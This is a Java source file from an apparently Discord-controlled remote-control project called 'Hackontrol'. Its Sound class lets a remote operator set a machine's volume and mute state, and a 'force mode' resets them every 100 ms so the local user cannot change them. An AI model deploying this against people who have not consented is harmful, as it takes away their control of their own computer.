package com.khopan.hackontrol.utils;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.nativelibrary.User;

import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;

public class Sound {
	public static final String MODAL_IDENTIFIER = "volumeChangeModal";

	private volatile float volume;
	private volatile boolean mute;
	private volatile boolean forceMode;

	public void volume(ButtonContext context) {
		TextInput textInput = TextInput.create("volume", "Volume", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(1)
				.setMaxLength(3)
				.setPlaceholder("0 - 100")
				.setValue(Integer.toString(Math.min(Math.max((int) Math.round(((double) (this.forceMode ? this.volume : User.getMasterVolume())) * 100.0d), 0), 100)))
				.build();

		context.replyModal(Modal.create(Sound.MODAL_IDENTIFIER, "New Volume").addActionRow(textInput).build()).queue();
	}

	public void mute(ButtonContext context) {
		this.buttonMute(context, true);
	}

	public void unmute(ButtonContext context) {
		this.buttonMute(context, false);
	}

	public void force(ButtonContext context) {
		this.buttonForceMode(context, true);
	}

	public void unforce(ButtonContext context) {
		this.buttonForceMode(context, false);
	}

	public void volumeModal(ModalContext context) {
		ModalMapping mapping = context.getValue("volume");

		if(mapping == null) {
			HackontrolError.message(context.reply(), "Volume cannot be null");
			return;
		}

		String text = mapping.getAsString();
		int volumeLevel;

		try {
			volumeLevel = Integer.parseInt(text);
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return;
		}

		if(volumeLevel < 0 || volumeLevel > 100) {
			HackontrolError.message(context.reply(), "Volume out of bounds, expected 0 - 100");
			return;
		}

		float volume = ((float) volumeLevel) / 100.0f;

		if(this.forceMode) {
			this.volume = volume;
		} else {
			User.setMasterVolume(volume);
		}

		context.deferEdit().queue();
	}

	public void initialize() {
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
			if(!this.forceMode) {
				return;
			}

			if(User.getMasterVolume() != this.volume) {
				User.setMasterVolume(this.volume);
			}

			if(User.isMute() != this.mute) {
				User.setMute(this.mute);
			}
		}, 0, 100, TimeUnit.MILLISECONDS);
	}

	private void buttonMute(ButtonContext context, boolean mute) {
		if((this.forceMode ? this.mute : User.isMute()) == mute) {
			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
			return;
		}

		if(!mute) {
			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> {
				if(this.forceMode) {
					this.mute = false;
				} else {
					User.setMute(false);
				}
			});

			return;
		}

		if(this.forceMode) {
			this.mute = true;
		} else {
			User.setMute(true);
		}

		context.deferEdit().queue();
	}

	private void buttonForceMode(ButtonContext context, boolean enable) {
		if(this.forceMode == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(!enable) {
			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.forceMode = false);
			return;
		}

		this.volume = User.getMasterVolume();
		this.mute = User.isMute();
		this.forceMode = true;
		context.deferEdit().queue();
	}
}
